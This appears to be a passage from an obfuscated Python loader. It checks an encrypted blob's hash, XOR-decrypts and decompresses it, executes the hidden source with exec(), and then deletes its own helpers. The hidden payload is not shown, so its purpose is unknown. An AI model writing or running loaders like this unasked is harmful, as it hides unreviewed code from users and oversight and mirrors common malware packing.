_cr9C1nupKKtQx_ + _ciOP2uNPc05tp9 + _cj4QDV0HSMPQX7 + _csfqeijmIgkI7N + _czNDX7bZqgMOvC + _cyHhwpiSieUSKA + _caVVlGgcgGezyE + _connv6wsYn1_4k + _cn0BnpqpdsAz2r + _cpJ8Q7mBToTprL + _cjBmnOEGc2p5xb + _czoELPaEJtItf8 + _cdkaJOSzK1PZAx + _cqFrTEQxmUdzFu + _cme9jbBqmoQ213 + _cgWwrcaZPglua8 + _ctXbyzO6f94ltY + _co4YuvcqhS3JZf + _cigQZCP6qkfCPW + _cob8IeACSo5tyP + _cqwx6aPN4Xld_7 + _cwE78PMjcbPTkn + _cgvANFCGA8Fnqh + _cqZAgusXnKrzl1 + _chs1aJKQEMFPR1 + _cqNhZANwS1VEMC + _ccMqO1djA3Wm7Q + _coiXNF1zcEso_Y + _chMTs6iiDEDlfJ + _ccKYBEftoyKySU + _clPjyOt3XrzlLN + _cflf7qs3aY81mQ + _cwCZBB2jtA7UnS + _cikDdu3RV7rhW7 + _cqvNskdHmpwbg7 + _cs3sh1rS3IboAG + _ca1rCr5m4gVUQz + _cdtZnxo7T5Se7D + _ciBa7YIGvi55jL + _cmKFyUDt5LKgD9 + _cd7KqvnQqnFPc1 + _cwedSxVKmeTbuB + _cuBsdXEPFwx3v3 + _cwRpk_uQjbzefL)
if __import__('hashlib').sha256(_pa22bhd4xKH0qA).hexdigest() != '324de70d9750b93f5c4f2b0d9e4103476b8e51acb3a21250a63dbc69d2d282cd':
    __import__('sys').exit(1)
_xouZMbtpyKNhOd = bytes([114, 130, 16, 120, 160, 95, 164, 107, 89, 70, 199, 25, 222, 28, 192, 140, 69, 220, 157, 6, 157, 250])
_fkrEgZw958dtUtu = bytes([255, 25, 91, 122, 244, 72, 82, 4, 133, 25, 241, 236, 159, 254, 148, 23, 71, 104, 230, 165, 194, 96])

def _fxg3slMU5SHvjHE(_blUN6cXG_v6KYi, _klwhzR0WNkSPPO):
    return bytes(_blUN6cXG_v6KYi[_ilZznnoQoID88R] ^ _klwhzR0WNkSPPO[_ilZznnoQoID88R % len(_klwhzR0WNkSPPO)] for _ilZznnoQoID88R in range(len(_blUN6cXG_v6KYi)))

def _fdiOOtI9c4UzsHt(_tyTdrZgnrlzL0O):
    import zlib
    return zlib.decompress(_tyTdrZgnrlzL0O) # Un seul niveau de zlib ici pour simplifier

def _fegIQwdGi768rwS():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xa_t579s547NrV = _fxg3slMU5SHvjHE(_pa22bhd4xKH0qA, _xouZMbtpyKNhOd)
    # 2. Décompression Zlib
    _dyNrelBP6eOHPe = _fdiOOtI9c4UzsHt(_xa_t579s547NrV)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dyNrelBP6eOHPe.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nvDSQ8ilzwoREc = _main.__dict__
    _nvDSQ8ilzwoREc.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nvDSQ8ilzwoREc)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fegIQwdGi768rwS()
try:
    del _fxg3slMU5SHvjHE, _fdiOOtI9c4UzsHt, _fegIQwdGi768rwS
    del _pa22bhd4xKH0qA, _xouZMbtpyKNhOd, _fkrEgZw958dtUtu
except:
    pass
